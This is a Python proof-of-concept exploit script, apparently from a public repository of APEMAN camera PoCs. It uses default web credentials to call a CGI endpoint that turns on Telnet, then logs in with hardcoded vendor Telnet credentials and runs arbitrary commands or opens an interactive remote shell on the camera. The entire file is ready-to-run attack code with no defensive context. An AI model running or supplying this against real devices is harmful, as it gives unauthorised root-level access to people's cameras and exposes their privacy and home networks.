#!/usr/bin/env python3

import argparse
import sys
import telnetlib
from http import client as http_client
from urllib.parse import urlencode

"""
[+] Created by Julio Ureña (PlainText)
[+] Web: https://plaintext.do
[+] Source: https://github.com/juliourena/APEMAN-Camera-PoCs/RCE/rce_apeman_id71.py
"""

def enable_telnet(host: str, port: int, loginuse: str, loginpas: str, timeout: int = 10) -> int:
    conn = http_client.HTTPConnection(host, port, timeout=timeout)
    params = {
        "loginuse": loginuse,
        "loginpas": loginpas,
        "cmd": "2101",
        "command": "1",
    }
    path = f"/trans_cmd_string.cgi?{urlencode(params)}"
    conn.request("GET", path)
    resp = conn.getresponse()
    status = resp.status
    try:
        resp.read()
    except Exception:
        pass
    conn.close()
    return status


def telnet_login(host: str, port: int, username: str, password: str, command: str | None, timeout: int = 10) -> int:
    tn = telnetlib.Telnet(host, port, timeout)
    # Login prompts may vary; try common ones
    tn.read_until(b"login:", timeout=timeout)
    tn.write(username.encode("ascii") + b"\n")
    tn.read_until(b"Password:", timeout=timeout)
    tn.write(password.encode("ascii") + b"\n")

    if command:
        tn.write(command.encode("ascii") + b"\n")
        tn.write(b"exit\n")
        output = tn.read_all()
        sys.stdout.buffer.write(output)
        return 0
    else:
        print("[+] Entering interactive Telnet session (Ctrl-] then 'quit' to exit)")
        tn.interact()
        return 0


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Enable Telnet via CGI and connect to it")
    parser.add_argument("--host", required=True, help="Camera host/IP")
    parser.add_argument("--port", type=int, required=True, help="Camera TCP port")
    parser.add_argument("--telnet-port", type=int, default=23, help="Telnet port (default: 23)")
    parser.add_argument("--loginuse", default="admin", help="CGI login username (default: admin)")
    parser.add_argument("--loginpas", default="888888", help="CGI login password (default: 888888)")
    parser.add_argument("--tn-user", default="vstarcam2017", help="Telnet username (default: vstarcam2017)")
    parser.add_argument("--tn-pass", default="20170912", help="Telnet password (default: 20170912)")
    parser.add_argument("--command", default=None, help="Optional command to run after Telnet login")
    parser.add_argument("--timeout", type=int, default=10, help="Network timeout seconds (default: 10)")

    args = parser.parse_args(argv)

    print("[+] Enabling Telnet via CGI ...")
    status = enable_telnet(args.host, args.port, args.loginuse, args.loginpas, args.timeout)
    print(f"[+] CGI enable Telnet response: HTTP {status}")
    if status >= 400:
        print("[!] Warning: Enabling Telnet returned an error status; proceeding to Telnet anyway.")

    print(f"[+] Connecting to Telnet at {args.host}:{args.telnet_port} ...")
    return telnet_login(args.host, args.telnet_port, args.tn_user, args.tn_pass, args.command, args.timeout)


if __name__ == "__main__":
    sys.exit(main())


